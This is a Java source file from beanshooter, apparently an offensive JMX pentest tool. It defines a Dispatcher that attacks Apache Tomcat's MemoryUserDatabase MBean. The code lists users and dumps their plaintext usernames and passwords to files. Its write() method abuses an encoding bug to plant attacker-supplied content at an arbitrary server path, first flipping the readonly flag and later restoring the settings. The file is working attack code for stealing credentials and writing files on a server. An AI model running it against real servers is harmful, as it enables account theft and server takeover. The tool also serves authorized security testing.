package de.qtc.beanshooter.mbean.tomcat;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import javax.management.Attribute;
import javax.management.MBeanException;

import de.qtc.beanshooter.cli.ArgumentHandler;
import de.qtc.beanshooter.exceptions.ExceptionHandler;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.mbean.MBean;
import de.qtc.beanshooter.mbean.MBeanInvocationHandler;
import de.qtc.beanshooter.operation.MBeanServerClient;

/**
 * Dispatcher class for the MemoryUserDatabaseMBean that is used by Apache tomcat.
 * Can be used to obtain user information from a tomcat service. Tomcat assigns a
 * separate UserMBean for each user. This class makes usage of beanshooters UserMBean
 * class to obtain more detailed user information.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class Dispatcher extends de.qtc.beanshooter.mbean.Dispatcher
{
    private final MemoryUserDatabaseMBean databaseBean;

    /**
     * Creates the dispatcher that operates on the MemoryUserDatabaseMBean.
     */
    public Dispatcher()
    {
        super(MBean.MEMORY_USER_DATABASE);

        MBeanInvocationHandler invo = new MBeanInvocationHandler(bean.getObjectName(), getMBeanServerConnection());
        databaseBean = (MemoryUserDatabaseMBean) Proxy.newProxyInstance(Dispatcher.class.getClassLoader(),
                                                            new Class<?>[] { MemoryUserDatabaseMBean.class },
                                                            invo);
    }

    /**
     * Obtain the available users on the remote MBeanServer, wrap their user information into
     * TomcatUser objects and return them as array.
     *
     * @return array of TomcatUser storing all information on the registered user accounts
     */
    public TomcatUser[] getUsers()
    {
        String[] users = null;

        try
        {
            users = (String[]) databaseBean.getAttribute("users");
        }

        catch (MBeanException e)
        {
            ExceptionHandler.unexpectedException(e, "obtaining", "tomcat user list", false);
        }

        if( users == null || users.length == 0)
            return new TomcatUser[] {};

        TomcatUser[] tomcatUsers = new TomcatUser[users.length];

        for(int ctr = 0; ctr < users.length; ctr++)
        {
            UserBeanDispatcher userDispatcher = UserBeanDispatcher.getDispatcher(users[ctr]);

            String username = userDispatcher.getName();
            String password = userDispatcher.getPassword();
            String[] roles = userDispatcher.getRoles();
            String[] groups = userDispatcher.getGroups();

            tomcatUsers[ctr] = new TomcatUser(username, password, groups, roles);
        }

        return tomcatUsers;
    }

    /**
     * List available users on the tomcat server.
     */
    public void list()
    {
        TomcatUser[] users = getUsers();

        if( users.length == 0 )
        {
            Logger.printlnMixedYellow("tomcat server", "does not", "contain any users.");
            return;
        }

        Logger.println("Listing tomcat users:");
        Logger.increaseIndent();

        for(TomcatUser user : users)
        {
            Logger.lineBreak();
            user.listUser();
        }

        Logger.decreaseIndent();
    }

    /**
     * Dump available credentials from the tomcat server.
     */
    public void dump()
    {
        String userFile = ArgumentHandler.require(MemoryUserDatabaseMBeanOption.USER_FILE);
        String passFile = MemoryUserDatabaseMBeanOption.PASS_FILE.getValue();

        Path userPath = Paths.get(userFile).normalize().toAbsolutePath();
        Path passPath = null;

        if (passFile != null)
            passPath = Paths.get(passFile).normalize().toAbsolutePath();

        TomcatUser[] users = getUsers();

        if( users.length == 0 )
        {
            Logger.printlnMixedYellow("tomcat server", "does not", "contain any users.");
            return;
        }

        Logger.println("Dumping credentials...");

        try (PrintWriter pw = new PrintWriter(new BufferedWriter(new FileWriter(userPath.toString()))))
        {
            for (TomcatUser user : users)
            {
                if (passPath == null)
                    pw.println(user.getUsername() + ":" + user.getPassword());

                else
                    pw.println(user.getUsername());
            }

            Logger.printlnMixedYellow("Users dumped to", userPath.toString());
        }

        catch (IOException e)
        {
            ExceptionHandler.handleFileWrite(e, userPath.toString(), true);
        }

        if (passPath == null)
            return;

        try (PrintWriter pw = new PrintWriter(new BufferedWriter(new FileWriter(passPath.toString()))))
        {
            for (TomcatUser user : users)
                pw.println(user.getPassword());

            Logger.printlnMixedYellow("Passwords dumped to", passPath.toString());
        }

        catch (IOException e)
        {
            ExceptionHandler.handleFileWrite(e, passPath.toString(), true);
        }
    }

    /**
     * Write a partially controlled file to the Tomcat server. This technique abuses an encoding bug within the
     * UserDatabase MBean of Apache Tomcat. The location of the user database is changed and a new role is created,
     * that contains the desired payload. Since roles can have arbitrary length, also larger payloads are possible.
     * Afterwards, the UserDatabase is saved to the new location, which creates an XML file containing the payload.
     * We reported the bug to Tomcat, but they did not consider it a security vulnerability (which is fine, as JMX
     * access is usually equivalent to server access). However, the encoding bug will probably be fixed in future
     * releases of Apache Tomcat.
     */
    public void write()
    {
        String fileContent = null;
        Path localFile = Paths.get(ArgumentHandler.<String>require(MemoryUserDatabaseMBeanOption.LOCAL_FILE)).normalize().toAbsolutePath();
        String remoteFile = ArgumentHandler.require(MemoryUserDatabaseMBeanOption.REMOTE_FILE);

        try
        {
            fileContent = new String(Files.readAllBytes(localFile));
            fileContent = "\"/>\n" + fileContent + "\n<a h=\"";
        }

        catch (IOException e)
        {
            ExceptionHandler.handleFileRead(e, localFile.toString(), true);
        }

        Logger.printMixedYellow("Writing local file", localFile.toString(), "to server location ");
        Logger.printlnPlainYellow(remoteFile);
        Logger.increaseIndent();
        MBeanServerClient client = getMBeanServerClient();

        try {
            String originalPathname = (String)client.getAttribute(bean.getObjectName(), "pathname");
            Logger.printlnMixedBlue("Current user database is at", originalPathname);

            boolean readonly = (boolean)client.getAttribute(bean.getObjectName(), "readonly");

            if (readonly)
            {
                Logger.printlnMixedBlue("Current user database is", "readonly");
                Logger.println("Adjusting readonly property to make it writable.");

                client.setAttribute(bean.getObjectName(), new Attribute("readonly", false));
            }

            Logger.printlnMixedYellow("Changing database path to", remoteFile);
            client.setAttribute(bean.getObjectName(), new Attribute("pathname", remoteFile));

            Logger.println("Creating new role containing the local file content.");
            client.invoke(bean.getObjectName(), "createRole", new String[] { String.class.getName(), String.class.getName() }, "__beanshooterRole__", fileContent);

            Logger.println("Saving modified user database.");
            client.invoke(bean.getObjectName(), "save", new String[] {}, new Object[] {});

            Logger.println("Removing newly created role.");
            client.invoke(bean.getObjectName(), "removeRole", new String[] { String.class.getName() }, "__beanshooterRole__");

            if (readonly)
            {
                Logger.printlnMixedBlue("Restoring", "readonly", "property.");
                client.setAttribute(bean.getObjectName(), new Attribute("readonly", true));
            }

            Logger.printlnMixedBlue("Restoring", "pathname", "property.");
            client.setAttribute(bean.getObjectName(), new Attribute("pathname", originalPathname));

            Logger.decreaseIndent();
            Logger.printlnYellow("All done.");

        } catch (Exception e) {
            ExceptionHandler.unexpectedException(e, "write", "action", true);
        }
    }

    /**
     * List available users on the tomcat server.
     */
    public void enumerate()
    {
        Logger.printlnBlue("Enumerating tomcat users:");
        Logger.lineBreak();
        Logger.increaseIndent();

        TomcatUser[] users = getUsers();
        if( users.length == 0 )
        {
            Logger.printlnMixedYellow("- tomcat server", "does not", "contain any users.");
        }

        else
        {
            Logger.printlnMixedYellow("- Listing", String.valueOf(users.length), "tomcat users:");
            Logger.increaseIndent();

            for(TomcatUser user : users)
            {
                Logger.lineBreak();
                user.listUser();
            }

            Logger.decreaseIndent();
        }

        Logger.decreaseIndent();
    }
}
